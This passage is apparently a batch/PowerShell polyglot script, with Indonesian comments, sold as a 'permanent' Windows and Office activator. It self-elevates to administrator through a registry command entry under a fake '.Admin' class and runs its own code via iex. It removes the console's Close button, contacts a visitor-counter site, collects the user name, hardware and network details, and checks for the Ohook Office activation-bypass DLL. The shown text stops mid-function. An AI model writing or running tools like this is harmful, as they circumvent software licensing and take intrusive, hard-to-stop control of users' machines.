<# ::
@echo off
title // ACTIVATOR WINDOWS + OFFICE PERMANENT - AuroraTOOLKIT - HINZDC X SARGA
mode con cols=90 lines=42
color 0B

:Begin UAC check and Auto-Elevate Permissions
:-------------------------------------
REM  --> Check for permissions
echo:
echo:
echo                 Requesting Administrative Privileges...
echo:
echo                 ENABLING ADMINISTRATOR RIGHTS...
echo                 Press YES in UAC Prompt to Continue
echo.
echo		 	     Please Wait...
echo:

::# elevate with native shell by AveYo
>nul reg add hkcu\software\classes\.Admin\shell\runas\command /f /ve /d "cmd /x /d /r set \"f0=%%2\"& call \"%%2\" %%3"& set _= %*
>nul fltmc|| if "%f0%" neq "%~f0" (cd.>"%temp%\runas.Admin" & start "%~n0" /high "%temp%\runas.Admin" "%~f0" "%_:"=""%" & cls & exit /b)

    pushd "%CD%"
    CD /D "%~dp0"
cls

reg add "HKCU\Console" /v QuickEdit /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Console\%SystemRoot%_system32_cmd.exe" /v QuickEdit /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Console\%SystemRoot%_SysWOW64_cmd.exe" /v QuickEdit /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Console\%SystemRoot%_Sysnative_cmd.exe" /v QuickEdit /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe" /v QuickEdit /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Console\%SystemRoot%_system32_conhost.exe" /v QuickEdit /t REG_DWORD /d 0 /f >nul 2>&1

powershell -c "iex ((Get-Content '%~f0') -join [Environment]::Newline); iex 'main %*'"
goto :eof

#>

#-----------------------------------------------------------------------------------------
$ProgressPreference = 'SilentlyContinue'
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class ConsoleControl {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

    [DllImport("user32.dll")]
    public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern int GetSystemMenu(IntPtr hWnd, bool bRevert);

    [DllImport("user32.dll")]
    public static extern bool RemoveMenu(int hMenu, int uPosition, int uFlags);
}
"@

# Mendapatkan handle jendela konsol saat ini
$consoleHandle = [ConsoleControl]::GetConsoleWindow()

# Mengatur constant untuk mengubah properti jendela konsol
$GWL_STYLE = -16
$WS_MAXIMIZEBOX = 0x10000
$WS_SIZEBOX = 0x40000

# Mengambil style jendela saat ini
$currentStyle = [ConsoleControl]::GetWindowLong($consoleHandle, $GWL_STYLE)

# Menghapus kemampuan untuk diubah ukurannya, dimaksimalkan dan menutup jendela
$newStyle = $currentStyle -band -bnot $WS_SIZEBOX -band -bnot $WS_MAXIMIZEBOX

# Menerapkan style baru ke jendela
[ConsoleControl]::SetWindowLong($consoleHandle, $GWL_STYLE, $newStyle) > $null

# Menyembunyikan jendela jika sudah dimodifikasi (untuk memastikan tidak ada kesalahan)
[ConsoleControl]::ShowWindow($consoleHandle, 5) > $null  # 5 = SW_SHOW

# Menghapus menu sistem (termasuk tombol Close/X)
$hMenu = [ConsoleControl]::GetSystemMenu($consoleHandle, $false)
[ConsoleControl]::RemoveMenu($hMenu, 0xF060, 0x0) > $null  # 0xF060 = SC_CLOSE (tombol Close)

function UnQuickEdit
{
	$t=[AppDomain]::CurrentDomain.DefineDynamicAssembly((Get-Random), 1).DefineDynamicModule((Get-Random), $False).DefineType((Get-Random))
	$t.DefinePInvokeMethod('GetStdHandle', 'kernel32.dll', 22, 1, [IntPtr], @([Int32]), 1, 3).SetImplementationFlags(128)
	$t.DefinePInvokeMethod('SetConsoleMode', 'kernel32.dll', 22, 1, [Boolean], @([IntPtr], [Int32]), 1, 3).SetImplementationFlags(128)
	$t.DefinePInvokeMethod('GetConsoleWindow', 'kernel32.dll', 22, 1, [IntPtr], @(), 1, 3).SetImplementationFlags(128)
	$t.DefinePInvokeMethod('SendMessageW', 'user32.dll', 22, 1, [IntPtr], @([IntPtr], [UInt32], [IntPtr], [IntPtr]), 1, 3).SetImplementationFlags(128)
	$k=$t.CreateType()
	if ($winbuild -GE 17763) {
		if ($k::SendMessageW($k::GetConsoleWindow(), 127, 0, 0) -EQ [IntPtr]::Zero) {
			return
		}
	}
	$v=(0x0080, 0x00A0)[!($winbuild -GE 10586)]
	$b=$k::SetConsoleMode($k::GetStdHandle(-10), $v)
}
UnQuickEdit
#-----------------------------------------------------------------------------------------
# Ambil handle jendela aktif (foreground window)
Add-Type -Name Win32 -Namespace Win32Functions -MemberDefinition @"
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

    [DllImport("user32.dll")]
    public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

    public struct RECT {
        public int Left;
        public int Top;
        public int Right;
        public int Bottom;
    }
"@

$hwnd = [Win32Functions.Win32]::GetForegroundWindow()

if ($hwnd -eq [IntPtr]::Zero) {
    return
}

# Ambil ukuran jendela
$rect = New-Object Win32Functions.Win32+RECT
[Win32Functions.Win32]::GetWindowRect($hwnd, [ref]$rect) | Out-Null
$w = $rect.Right - $rect.Left
$h = $rect.Bottom - $rect.Top

# Pindahkan jendela ke posisi baru tanpa mengubah ukuran
[Win32Functions.Win32]::MoveWindow($hwnd, 50, 10, $w, $h, $true)

#-----------------------------------------------------------------------------------------
$Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(90, 42)
$Host.UI.RawUI.WindowTitle = '> ACTIVATOR WINDOWS + OFFICE PERMANENT - AuroraTOOLKIT - HINZDC X SARGA'
Clear-DnsClientCache
[Console]::OutputEncoding = [System.Text.Encoding]::utf8
Clear-Host
# ASCII Art dalam Unicode [char]
$colors = @("Cyan", "Blue", "Red", "White", "DarkRed", "DarkCyan")
$randomColor = Get-Random -InputObject $colors
$randomColor2 = Get-Random -InputObject $colors
$text = @"

                                                  $([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2557)
         $([char]0x2554)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2563)  OLIH X SARGA A.K.A HINZDC  $([char]0x2551)
         $([char]0x2551)                                        $([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2563)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2591)  $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2591)  $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2592)$([char]0x2592) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)                                                                      $([char]0x2551)
         $([char]0x2551)        $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x255A)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2566)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x255D) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)         $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2591)$([char]0x2591)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2584) $([char]0x2588)$([char]0x2588)$([char]0x2566)$([char]0x2588)$([char]0x2588) $([char]0x2584) $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588)$([char]0x2588)     $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)$([char]0x2569)$([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2591) $([char]0x2591)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)  $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)                    $([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x255D) $([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)                                         $([char]0x2551)
         $([char]0x255A)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x255D)
"@
Write-Host $text -ForegroundColor $randomColor
Write-Host "                        -- ACTIVATOR WINDOWS & OFFICE PERMANENT --" -ForegroundColor $randomColor2
Write-Host "------------------------------------------------------------------------------------------"
Write-Host "   SERVICE - SPAREPART - UPGRADE - MAINTENANCE - INSTALL ULANG - JUAL - TROUBLESHOOTING   " -foregroundColor White
Write-Host "------------------------------------------------------------------------------------------"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Start-Sleep -s 3

#-----------------------------------------------------------------------------------------
$StartDTM = (Get-Date)
Write-Host " START " -BackgroundColor Green -ForegroundColor White -NoNewline
Write-Host " $StartDTM " -BackgroundColor White -ForegroundColor Black -NoNewLine

# URL dari halaman yang akan diambil
# $url = "https://vbr.nathanchung.dev/badge?page_id=hinzdc-activeauto"
$url = "https://visitor-badge.imlete.cn/?id=activeauto"

# Mengambil konten halaman web
$response = Invoke-WebRequest -Uri $url -UseBasicParsing

# Memeriksa apakah respons berhasil
if ($response.StatusCode -eq 200) {
    # Mengambil konten HTML dari respons
    $htmlContent = $response.Content

    # Parsing konten SVG untuk mendapatkan nilai "Visitors"
    if ($htmlContent -match '<text[^>]*>\s*(\d+)\s*<\/text>') {
        $visitorCount = $matches[1]

        # Mencetak nilai ke terminal
        $label = Write-Host " DIAKSES " -BackgroundColor Blue -ForegroundColor White -NoNewline
        $number = Write-Host " $visitorCount " -BackgroundColor Red -ForegroundColor White -NoNewline
        $times = Write-Host " KALI " -BackgroundColor DarkBlue -ForegroundColor White
    } else {
        Write-Host " Please Connect to Internet.." -BackgroundColor Red -ForegroundColor White
    }
} else {
    Write-Output "$($response.StatusCode)"
}
$null = $label, $number, $times

#-----------------------------------------------------------------------------------------
# Array berisi kata-kata mutiara
$kataMutiara = @(
    "Janganlah engkau mengucapkan perkataan yang engkau sendiri tak suka mendengarnya jika orang lain mengucapkannya kepadamu."
    "Jangan gunakan ketajaman kata-katamu pada ibumu yang mengajarimu cara berbicara."
    "Kemarahan dimulai dengan kegilaan dan berakhir dengan penyesalan."
    "Kesalahan terburuk kita adalah ketertarikan kita pada kesalahan orang lain."
    "Jangan melibatkan hatimu dalam kesedihan atas masa lalu atau kamu tidak akan siap untuk apa yang akan datang."
    "Barangsiapa menyalakan api fitnah, maka dia sendiri yang akan menjadi bahan bakarnya."
    "Jangan menjelaskan tentang dirimu kepada siapapun, karena yang menyukaimu tidak butuh itu. Dan yang membencimu tidak percaya itu."
    "Balas dendam terbaik adalah menjadikan dirimu lebih baik."
    "Hiduplah seakan-akan kamu akan mati besok. Belajarlah seakan-akan kamu akan hidup untuk selamanya."
    "Cara untuk memulai adalah dengan berhenti berbicara dan mulai melakukan."
    "Dalam hidup, kamu akan mendapatkan teman, tetapi hanya satu yang sejati di saat-saat terburukmu."
    "Hal-hal baik membutuhkan waktu, jadi bersikaplah positif dan sabar."
    "Berhenti bermimpi, mulailah bekerja dan kejar impianmu."
    "Perubahan dimulai dari langkah kecil."
    "Bahagia itu sederhana, bersyukur saja."
    "Keajaiban terjadi saat kamu percaya."
    "Jadilah versi terbaik dirimu."
    "Kebahagiaan datang dari hati yang tenang."
    "Fokus pada solusi, bukan masalah."
    "Mulai dari sekarang, jangan menunda."
    "Hidup itu naik turun, nikmati perjalanannya."
    "Kunci kebahagiaan adalah bersyukur."
    "Jangan bandingkan dirimu dengan orang lain."
    "Jadilah cahaya dalam kegelapan."
    "Percayalah pada prosesnya."
    "Hidup hanya sekali, jadikan berarti."
    "Cintai dirimu sebelum mencintai orang lain."
    "Jangan berhenti mencoba, jangan pernah menyerah."
    "Keberhasilan datang dari keyakinan pada diri sendiri."
    "Kebahagiaan sejati datang dari dalam."
    "Tidak ada jalan pintas menuju puncak."
    "Jangan hanya berlari, melesatlah."
    "Kemarin aku pintar, jadi aku ingin mengubah dunia. Hari ini aku bijak, jadi aku mengubah diriku sendiri."
    "Hiduplah seolah-olah kamu akan mati besok. Belajarlah seolah-olah kamu akan hidup selamanya."
    "Hidupmu dibentuk oleh pikiranmu. Apa yang kamu pikirkan, itulah dirimu."
    "Tidak peduli seberapa lambat kamu berjalan selama kamu tidak berhenti."
    "Jangan pernah menunda untuk besok apa yang bisa kamu lakukan hari ini."
    "Kualitas hidupmu ditentukan oleh kualitas pertanyaan yang kamu ajukan."
    "Sebaik-baik manusia adalah yang paling bermanfaat bagi orang lain."
    "Orang kuat bukan yang pandai bergulat, tetapi yang mampu mengendalikan diri saat marah."
    "Berbahagialah dengan apa yang Allah takdirkan, karena itu adalah pilihan terbaik untukmu."
    "Barangsiapa yang memperbaiki hubungannya dengan Allah, maka Allah akan memperbaiki hubungannya dengan manusia."
    "Ilmu itu seperti air, ia hanya mengalir ke tempat yang rendah hati."
    "Jangan merasa takut dengan rezeki yang tertunda, karena apa yang telah ditetapkan bagimu tidak akan pernah luput darimu."
    "Jangan lihat siapa yang berbicara, tetapi lihatlah apa yang dia bicarakan."
    "Jika kamu menemukan kekurangan pada temanmu, tutupilah dengan nasihat, bukan cacian."
    "Dunia ini hanyalah bayangan, kejar bayangan itu, dan ia akan lari darimu. Tapi berpalinglah dari bayangan itu, maka ia akan mengikutimu."
    "Waktu adalah pedang; jika kamu tidak memanfaatkannya, maka ia akan memotongmu."
    "Barang siapa mengenal dirinya, maka ia akan mengenal Tuhannya."
    "Jika kmau merasakan sakit, kamu hidup. Jika kamu merasakan sakit orang lain, kamu adalah seorang manusia - Leo Tolstoy."
    "Apa yang membuatmu begitu takut kehilangan, jika sebenarnya tidak ada satu pun di dunia ini yang benar benar menjadi milikmu?"
    "Banyak orang menjadi tidak menarik setelah kamu mengetahui cara berpikir mereka. - Damian Marley"
    "Tidak ada yang dapat membunuhmu lebih cepat daripada pikiranmu sendiri. Tetap tenang dan jangan stress atas hal-hal yang berada di luar kendalimu"
    "Tidak ada yang bisa didapatkan tanpa kehilangan. Bahkan Surga menuntut kematian. - The Eagle"
    "saya cukup pintar untuk tahu bahwa saya bodoh. - Richard Feynman"
    "Lebih mudah untuk menipu seseorang daripada meyakinkan mereka bahwa mereka telah ditipu. - Mark Twain"
    "kenyataan tidak pernah sebaik imajinasimu. - Pepatah Jepang"
    "Aku talah belajar selama bertahun-tahun bahwa bukan tempat tinggalmu yang penting, melainkan ora-orang yang ada di sekitarmu yang membuatmu merasa di rumah. -J.B. McGee"
    "Hanya butuh 2 tahun untuk belajar berbicara dan enam puluh tahun untuk belajar diam. - Ernest Hemingway"
    "Ketika hendak melakukan perjalanan, janganlah meminta nasihat dari orang yan tidak pernah meninggalkan rumah. - Rumi"
    "Permasalahan dunia adalah orang cerdas penuh keraguan, dan orang bodoh penuh percaya diri. - Bertrand Russell"
    "Jika segala sesuatu di sekiatar kamu tampak gelap. coba lihat lagi, mungkin kamu yang memancarkan cahaya. - Rumi"
    "Apa yang kamu pikirkan tentang dirimu jauh lebih penting daripada apa yang orang lain pikirkan tentangmu. Seneca"
    "Jika rencanamu gagal, ubah rencanamu. Tapi jangan ubah tujuanmu."
    "Keajaiban terjadi ketika kamu berani melangkah keluar dari zona nyaman."
    "Jangan pernah berhenti belajar, karena kehidupan tidak pernah berhenti mengajarkan."
    "Terkadang, yang terbaik bukanlah mendapatkan semua jawaban, tetapi menikmati proses pencariannya."
    "Kamu lebih kuat dari yang kamu pikirkan."
    "Hujan turun sebelum pelangi muncul. Begitu juga kesulitan sebelum kebahagiaan."
    "Orang sukses tidak lebih pintar, mereka hanya lebih gigih."
    "Satu-satunya hal yang lebih buruk daripada gagal adalah tidak pernah mencoba."
    "Jangan biarkan kegagalan hari ini membuatmu berhenti mencoba esok hari."
    "Jangan bandingkan awal perjalananmu dengan pencapaian orang lain."
    "Apa gunanya mengkhawatirkan sesuatu yang sudak tak terhindarkan - Hayao Miyazaki"
    "Kebodohan adalah penyakit yang paling mematikan, karena penderitanya tidak sadar sedang sakit. -Sokrates"
    "Semakin panjang penjelasan, semakin besar kebohongan yang disembunyikan. - George Orwell"
    "Hindari berdebat dengan orang dungu, mereka akan menarikmu ke level mereka kemudian menghancurkanmu dengan pengalaman mereka. - Mark Twain"
    "Sibodoh berdoa untuk jalan yang mudah, si bijak berdoa diberikan kaki yang kuat. - Pepatah Tiongkok"
    "aku belajar bahwa setiap manusia akan merasakan kematian, tapi hanya sedikit yang benar-benar merasakan hidup. - Paulo Celho"
    "Dia yang bertanya akan kelihatann bodoh selama 5 menit, tapi dia yang tidak berani bertanya akan bodoh selamanya. - Pepatah Cina"
    "Ketika seseorang sedang tenggelam, itu bukanlah waktu yang tepat untuk mengajarinya cara berenang. - Pepatah Cina"
    
)

# Mengambil satu kata mutiara secara acak
$kataAcak = Get-Random -InputObject $kataMutiara

function WrapTextToFitWidth {
    param (
        [string]$text  # Teks yang ingin dibungkus
    )

    # Mendapatkan lebar terminal saat ini
    $width = $Host.UI.RawUI.WindowSize.Width

    # Membungkus teks berdasarkan lebar terminal tanpa memotong kata
    $words = $text -split '\s+'  # Membagi teks menjadi kata-kata
    $line = ""

    foreach ($word in $words) {
        if (($line.Length + $word.Length + 1) -gt $width) {
            Write-Host  $line -fore red # Menampilkan baris yang sudah penuh
            $line = $word  # Memulai baris baru dengan kata berikutnya
        } else {
            if ($line.Length -gt 0) {
                $line += " "  # Menambahkan spasi antara kata
            }
            $line += $word  # Menambahkan kata ke baris
        }
    }

    # Menampilkan baris terakhir yang belum dicetak
    if ($line.Length -gt 0) {
        Write-Host  $line -ForegroundColor red
    }
}

$text = $kataAcak
#-----------------------------------------------------------------------------------------
function Get-ComputerSystemInfo {
    $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct
    return @{
        Manufacturer = $computerSystem.Vendor
        Type = $computerSystem.Version
        Model = $computerSystem.Name
    }
}

function Get-OSInfo {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $username = $currentUser.Split('\')[-1]
    $user = Get-CimInstance -ClassName Win32_UserAccount -Filter "Name='$username'" | Select-Object -Property Name, FullName
    $os = Get-CimInstance -ClassName Win32_OperatingSystem
    $winversion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DisplayVersion
    if (-not $winversion) {
        $winversion = $null
    }
    return @{
        OSName = $os.Caption
        OSVersion = $os.Version
        WindowsVersion = $winversion
        Architecture = $os.OSArchitecture
        User = $user.Name
    }
}

function Get-ProcessorInfo {
    $processor = Get-CimInstance -ClassName Win32_Processor
    return @{
        Name = $processor.Name
        Cores = $processor.NumberOfCores
        LogicalProcessors = $processor.NumberOfLogicalProcessors
    }
}

function Get-RAMInfo {
    $ramInfo = Get-WmiObject Win32_PhysicalMemory
    $totalSizeInGB = 0
    $ramDetails = @()
    foreach ($ram in $ramInfo) {
        $sizeInGB = [math]::Round($ram.Capacity / 1GB, 2)
        $totalSizeInGB += $sizeInGB
        $ramDetails += "$($ram.Manufacturer) $sizeInGB GB ($($ram.Speed) MHz)"
    }
    return @{
        TotalSizeInGB = $totalSizeInGB
        Modules = $ramDetails -join " -- "
    }
}

function Get-DiskInfo {
    $disks = Get-CimInstance -ClassName Win32_DiskDrive
    $diskall = ""
    foreach ($disk in $disks) {
        $modeldisk = $disk.Model
        $sizeInGB = [math]::round($disk.Size / 1GB, 2)
        $diskall += "- $modeldisk - $sizeInGB GB`n"
    }
    return $diskall
}

function Get-NetworkInfo {
    $wifi = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match 'Wireless' -and $_.Status -eq 'Up' }
    if ($wifi) {
        $wifiName = (Get-NetConnectionProfile -InterfaceAlias $wifi.Name).Name
    } else {
        $wifiName = "Tidak ada Wi-Fi yang terhubung."
    }

    $lanAdapter = Get-NetAdapter | Where-Object { $_.MediaConnectionState -eq 'Connected' -and $_.InterfaceDescription -notmatch 'Wireless' }
    if ($lanAdapter) {
        $lanStatus = "LAN terhubung: $($lanAdapter.Name)"
        $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -ErrorAction SilentlyContinue
        if ($pingResult.StatusCode -eq 0) {
            $internetStatus = "Internet melalui LAN terhubung."
        } else {
            $internetStatus = "Internet melalui LAN tidak terhubung."
        }
    } else {
        $lanStatus = "Tidak ada LAN yang terhubung."
        $internetStatus = "Internet melalui LAN tidak tersedia."
    }

    return @{
        WifiName = $wifiName
        LanStatus = $lanStatus
        InternetStatus = $internetStatus
    }
}

function Get-ActivationStatus {
    $SlmgrDli = cscript /Nologo "C:\Windows\System32\slmgr.vbs" /dli 2>&1
    $SlmgrXpr = cscript /Nologo "C:\Windows\System32\slmgr.vbs" /xpr 2>&1
    return @{
        SlmgrDli = $SlmgrDli
        SlmgrXpr = $SlmgrXpr
    }
}

function CheckOhook {
    $ohook = 0
    $paths = @("${env:ProgramFiles}", "${env:ProgramW6432}", "${env:ProgramFiles(x86)}")

    foreach ($version in 15, 16) {
        foreach ($path in $paths) {
            if (Test-Path "$path\Microsoft Office\Office$version\sppc*.dll") {
                $ohook = 1
            }
        }
    }

    foreach ($systemFolder in "System", "SystemX86") {
        foreach ($officeFolder in "Office 15", "Office") {
            foreach ($path in $paths) {
                if (Test-Path "$path\Microsoft $officeFolder\root\vfs\$systemFolder\sppc*.dll") {
                    $ohook = 1
                }
            }
        }
    }

    if ($ohook -eq 0) {
        return @"
        // Ohook Office Activation Status //
        Ohook Office aktivasi tidak ditemukan. Silakan lakukan proses aktivasi lagi.
"@
    }
    
    return @"
    // Ohook Office Activation Status //
    
    Ohook for permanent Office activation is installed.
"@
}

function Get-OfficeActivationStatus {
    $osppPaths = @(
        "$env:ProgramFiles\Microsoft Office\Office16\OSPP.VBS",
        "$env:ProgramFiles(x86)\Microsoft Office\Office16\OSPP.VBS",
        "$env:ProgramFiles\Microsoft Office\Office15\OSPP.VBS",
        "$env:ProgramFiles(x86)\Microsoft Office\Office15\OSPP.VBS"
    )

    $validPath = $osppPaths | Where-Object { Test-Path $_ } | Select-Object -First 1

    if ($validPath) {
        $output = cscript $validPath /dstatus | Out-String
    } else {
        return @()
    }

    $outputLines = $output -split "`n"
    $entries = @()
    $currentEntry = @{
        ProductID = ""
        SkuID = ""
        LicenseName = ""
        LicenseDescription = ""
        LicenseStatus = ""
        ErrorCode = ""
        ErrorDescription = ""
        RemainingGrace = ""
        ProductKey = ""
    }

    foreach ($line in $outputLines) {
        if ($line -match "PRODUCT ID:") {
            $currentEntry.ProductID = $line.Trim()
        } elseif ($line -match "SKU ID:") {
            $currentEntry.SkuID = $line.Trim()
        } elseif ($line -match "LICENSE NAME:") {
            if ($currentEntry.LicenseName) {
                $entries += $currentEntry
                $currentEntry = @{
                    ProductID = $currentEntry.ProductID
                    SkuID = $currentEntry.SkuID
                    LicenseName = $line.Trim()
                    LicenseDescription = ""
